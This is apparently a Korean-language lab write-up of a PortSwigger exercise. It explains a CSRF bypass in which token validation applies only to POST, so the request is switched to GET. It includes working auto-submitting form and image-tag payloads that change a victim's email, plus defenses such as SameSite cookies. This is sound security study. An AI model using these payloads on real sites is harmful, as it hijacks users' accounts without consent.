# Lab: CSRF where token validation depends on request method

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — CSRF 토큰 / 메서드별 검증 불일치 / GET 우회
- **링크**: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

## 목표

서버가 POST 요청에만 CSRF 토큰을 검증하고 GET 요청은 검증하지 않는 허점을 이용해, 폼 메서드를 GET 으로 변경하여 이메일을 변경한다.

## 취약점 분석

```
정상 POST 요청:
  POST /my-account/change-email
  Body: email=victim@email.com&csrf=VALID_TOKEN
  → 서버: csrf 토큰 검증 → 유효하면 처리

GET 요청으로 변경:
  GET /my-account/change-email?email=attacker@evil.com
  → 서버: GET 메서드는 csrf 검증 로직 없음 → 그냥 처리!
```

서버 측 처리 코드의 의사 표현:

```python
if request.method == 'POST':
    csrf_token = request.POST.get('csrf')
    if not validate_csrf(csrf_token):
        return 403  # ← POST 만 검증
# GET 이면 여기로 바로 옴 → 검증 없음

email = request.GET.get('email') or request.POST.get('email')
change_email(email)  # ← 실행됨
```

## 공격 방법

### 페이로드 (공격 서버에 호스팅)

```html
<html>
  <body>
    <form action="https://VULNERABLE-SITE.com/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

`method="GET"` 이므로 폼 제출 시 쿼리스트링으로 변환:

```
GET /my-account/change-email?email=attacker@evil.com HTTP/1.1
Cookie: session=VICTIM_SESSION  ← 자동 첨부
```

### 더 간단한 변형 — 이미지 태그 이용

```html
<img src="https://VULNERABLE-SITE.com/my-account/change-email?email=attacker@evil.com">
```

이미지 로드 = GET 요청 → 쿠키 자동 첨부 → 이메일 변경.

## 001 랩과의 비교

| 항목 | 001 랩 (방어 없음) | 002 랩 (이번) |
|------|------------------|--------------|
| CSRF 토큰 | 없음 | 있음 (POST 전용) |
| 우회 방법 | 그대로 POST 위조 | 메서드를 GET 으로 변경 |
| 공격 결과 | 동일 — 이메일 변경 | 동일 — 이메일 변경 |
| 서버의 착각 | 방어 없음 | "POST 에 토큰 있으니 안전" |

## 핵심 정리

- CSRF 토큰을 일부 메서드에만 적용하면 우회 가능하다 — 상태를 변경하는 모든 요청에 일관되게 적용해야 한다.
- GET 요청으로도 상태 변경이 가능한 엔드포인트는 추가 취약점이다 (HTTP 표준 위반).
- **방어**:
  - 상태를 변경하는 작업은 반드시 POST/PUT/DELETE 를 사용하고 GET 으로는 처리하지 않음
  - 모든 상태 변경 요청(메서드 무관)에 CSRF 토큰 검증 적용
  - `SameSite=Strict` 쿠키: 메서드에 무관하게 외부 요청에 쿠키 미전송

## 배운 점 및 추가 학습

### 1. HTTP 메서드와 상태 변경

```
HTTP 표준의 메서드별 의미:
  GET     — 조회 (안전, 멱등)
  POST    — 생성/처리 (비안전, 비멱등)
  PUT     — 전체 교체 (안전 아님, 멱등)
  PATCH   — 부분 수정 (안전 아님, 비멱등)
  DELETE  — 삭제 (안전 아님, 멱등)

"안전(Safe)": 서버 상태를 변경하지 않음
→ GET 은 상태를 변경하면 안 됨 (HTTP 표준)
→ 그러나 실제 구현에서 GET 으로 상태 변경하는 경우가 있음
→ CSRF 취약점 + HTTP 표준 위반
```

### 2. CSRF 토큰 검증 허점 유형 (다음 랩 예고)

```
[메서드별 불일치] ← 이번 랩
  POST → 검증
  GET  → 미검증

[토큰 존재 여부만 확인]
  토큰이 있으면 검증
  토큰 파라미터 자체를 제거하면? → 검증 스킵

[토큰 풀(Pool) 미관리]
  다른 사용자의 토큰도 유효하게 처리

[토큰과 세션 연결 없음]
  어떤 사용자의 토큰이든 같은 값이면 통과

[Referer 기반 검증]
  Referer 헤더가 없으면 검증 스킵
  Referer 헤더 조작 가능
```

### 3. GET vs POST CSRF 공격 방법 비교

```html
<!-- GET CSRF — 이미지/링크/iframe 등 다양한 방법 -->
<img src="https://target.com/action?param=value">
<a href="https://target.com/action?param=value">클릭</a>
<iframe src="https://target.com/action?param=value"></iframe>
<form method="GET" action="https://target.com/action">
  <input name="param" value="value">
</form>

<!-- POST CSRF — 폼 자동 제출 필요 -->
<form method="POST" action="https://target.com/action">
  <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit()</script>

<!-- POST를 GET으로 전환 (이번 랩) -->
<form method="GET" action="https://target.com/action">
  <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit()</script>
```

### 4. SameSite 쿠키로 메서드 무관 방어

```
Set-Cookie: session=abc; SameSite=Strict

SameSite=Strict:
  외부 사이트에서의 모든 요청에 쿠키 미전송
  → GET CSRF 도 차단 (GET 이미지 요청 포함)
  → POST CSRF 도 차단
  → 메서드에 무관하게 방어

SameSite=Lax (기본값):
  GET 탑레벨 네비게이션은 허용
  → <a href> 클릭 → 쿠키 전송 → GET CSRF 가능할 수 있음
  → <img src> 는 차단 → 이미지 GET CSRF 불가
  → POST 폼 제출은 차단

SameSite=None; Secure:
  모든 요청에 쿠키 전송 (명시적 허용)
  → CSRF 방어 없음
```
